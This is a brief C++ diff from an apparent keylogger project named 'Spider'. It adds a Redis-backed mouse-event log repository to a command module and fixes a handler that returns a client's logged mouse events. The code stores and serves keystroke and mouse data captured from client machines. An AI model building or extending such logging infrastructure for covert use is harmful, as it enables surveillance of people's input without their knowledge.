@@ -27,6 +27,7 @@ class CommanderModule : public ISpiderBusinessModule {
 
     std::unique_ptr<ISpiderKeyValueDatabaseDriver> _uuidRepository = std::unique_ptr<ISpiderKeyValueDatabaseDriver>(new RedisDriver<Sets>());;
     std::unique_ptr<SpiderTypedRepositoryDriver<SpiderKeyLoggingPayload>> _keylogRepository = std::unique_ptr<SpiderTypedRepositoryDriver<SpiderKeyLoggingPayload>>(new SpiderTypedRepositoryDriver<SpiderKeyLoggingPayload>(new RedisDriver<List>()));;
+    std::unique_ptr<SpiderTypedRepositoryDriver<SpiderMouseEvent>> _mouselogRepository = std::unique_ptr<SpiderTypedRepositoryDriver<SpiderMouseEvent>>(new SpiderTypedRepositoryDriver<SpiderMouseEvent>(new RedisDriver<List>()));
 
 private:
 
@@ -51,8 +52,7 @@ public:
         });
 
         _commandGetMouseLogListener->Register("GetClientMouseLog", [&](std::string clientId, GetClientMouseLog &payload) {
-            std::cout << "MOUSZ" << std::endl;
-            auto vec = _keylogRepository->GetSecondaryKeyElements("mouselog" + clientId, 0, payload.limit());
+            auto vec = _mouselogRepository->GetSecondaryKeyElements("mouselog" + clientId, 0, payload.limit());
             GetMouselogCommandResponse res;
             for(auto const& value: vec)
                 res.add_keylog()->CopyFrom(value);
